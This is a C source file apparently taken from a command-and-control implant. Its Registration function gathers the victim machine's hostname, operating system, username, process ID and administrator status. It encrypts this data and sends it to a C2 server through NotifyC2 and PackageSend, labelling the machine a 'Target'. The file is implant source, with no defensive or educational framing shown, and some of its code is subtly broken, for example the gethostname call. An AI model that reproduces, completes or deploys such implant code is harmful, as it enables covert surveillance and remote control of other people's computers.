#include "Cryptography/Encryption.h"
#include "Hams.h"
#include "Macro/Macro.h"
#include "Packer/Packer.h"
#include "Support/String.h"
#include "Transport/Transport.h"
#include "Debug.h"
#include "Support/Memory.h"
#include "Support/Network.h"
#include <process.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>


#if defined(_WIN32) || defined(_WIN64)
#include <windows.h>
#define SECURITY_WIN32
#include <security.h> // Required for GetUserNameEx
#pragma comment(lib, "Secur32.lib")

#define UsernameSize 256
#define OSSize 256
#define HostSize 256
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define NtCurrentProcess()        ((HANDLE)(LONG_PTR)-1)
#define NT_SUCCESS(status) ((NTSTATUS)(status) >= 0)
char *get_username()
{
    int UsernameLen = UsernameSize;
    char *Username = HMalloc(UsernameLen);
    GetUserNameExA(NameSamCompatible, Username, &UsernameLen);
    return Username;
}

#elif defined(__linux__) || defined(__unix__)
#include <pwd.h>
#include <sys/types.h>
#include <unistd.h>

char *get_username()
{
    struct passwd *pw;
    pw = getpwuid(getuid());
    return pw->pw_name;
}

#else
#error Platform not supported
#endif

char *GetOS()
{
    int OSLen = OSSize;
    char *OSName = HMalloc(OSLen);

#if defined(_WIN32) || defined(_WIN64)
    strcat(OSName, "windows");
#elif __APPLE__
    strcat(OSName, "darwin");
#elif defined(__linux__) || defined(__unix__)
    strcat(OSName, "linux");
// Add other platforms as needed...
#else
    strcat(OSName, "linux");
    const char OS[] = "unknown";
#endif
    return OSName;
}

char *GetHostName()
{
    int HostLen = HostSize;
    char *hostName = HMalloc(HostLen);

#if defined(_WIN32) || defined(_WIN64)

    if (GetComputerNameA(hostName, &HostLen) == 0)
    {
        RED_DPRINT("Error GetComputerNameA \n");
        return 0;
    }

#elif defined(__linux__) || defined(__unix__)

    if (gethostname(&hostName, HostLen) == -1)
    {
        RED_DPRINT("Error gethostname \n");
        return 0;
    }
#endif
    return hostName;
}
BOOL IsAdmin() {
  HANDLE hToken = NULL;
  TOKEN_ELEVATION Elevation = {0};
  DWORD cbSize = sizeof(TOKEN_ELEVATION);
  NTSTATUS NtStatus = STATUS_SUCCESS;

  if (NT_SUCCESS(NtStatus = OpenProcessToken(
                     NtCurrentProcess(), TOKEN_QUERY, &hToken))) {
    if (GetTokenInformation(hToken, TokenElevation, &Elevation,
                                           sizeof(Elevation), &cbSize)) {
      CloseHandle(hToken);
      return (BOOL)Elevation.TokenIsElevated;
    } else
      DPRINT("GetTokenInformation: Failed [%d]\n",
             GetLastError());
  } else {
    DPRINT("NtOpenProcessToken: Failed \n");
  }

  if (hToken)
    CloseHandle(hToken);

  return FALSE;
}


int Registration()
{
    srand(time(NULL));
    YELLOW_DPRINT(" Registering Target ...\n");
    unsigned char *IPv6 = NULL;
    char *Base32Buffer = NULL;
    int Base32BufferSize=0;
    char *username = NULL;
    char *OS = NULL;
    char *hostName = NULL;
    int processID = 0;
    PPACKAGE Packge = 0;
    int RegistrationStatus=0;
    processID = getpid();
    OS = GetOS();
    username = get_username();
    hostName = GetHostName();

    YELLOW_DPRINT(" HostName: [%s] \n", hostName);
    YELLOW_DPRINT(" processID: [%d] \n", processID);
    YELLOW_DPRINT(" OS: [%s] \n", OS);
    YELLOW_DPRINT(" Username: [%s] \n", username);

    Packge = PackageCreate();
    PackageAddBytes(Packge, hostName, strlen(hostName));
    PackageAddBytes(Packge, OS, strlen(OS));
    PackageAddBytes(Packge, username, strlen(username));
    PackageAddInt32(Packge, processID);
    PackageAddInt32(Packge, IsAdmin());
    DPRINT(" Packer Size: [%lu]\n", Packge->Length);

    Base32Buffer = EncryptData(Packge->Buffer, Packge->Length,&Base32BufferSize);
    if (Base32Buffer == 0)
    {
        RED_DPRINT("Registration EncryptData Error\n");
        goto Clean;
    }
    DPRINT(" EncryptData:[%s]\n", Base32Buffer);
    DPRINT(" EncryptData Size: [%lu]\n", Base32BufferSize);



    IPv6 = NotifyC2(strlen(Base32Buffer), MacroRegisterCode); // Need to be free
    if (IPv6 == 0)
    {
        RED_DPRINT("[-] Unable to Register Connection Error\n");
        goto Clean;
    }
    HFree(IPv6,INET6_ADDRSTRLEN);
    GREEN_DPRINT("NotifyC2 OK!\n");
    GREEN_DPRINT(" Sending Host Info Size [%lu] Byte Buffer [%s]\n",strlen(Base32Buffer), Base32Buffer);
    if (PackageSend(Base32Buffer, strlen(Base32Buffer), MacroRegisterRemaingCode))
    {
        EndNotifyC2();
    }

    GREEN_DPRINT("Registration Done!");
    RegistrationStatus=1;
Clean:

    HFree(Base32Buffer,Base32BufferSize);
    PackageDestroy(Packge);
    HFree(username,UsernameSize);
    HFree(hostName,HostSize);
    HFree(OS,OSSize);

    return RegistrationStatus;
}
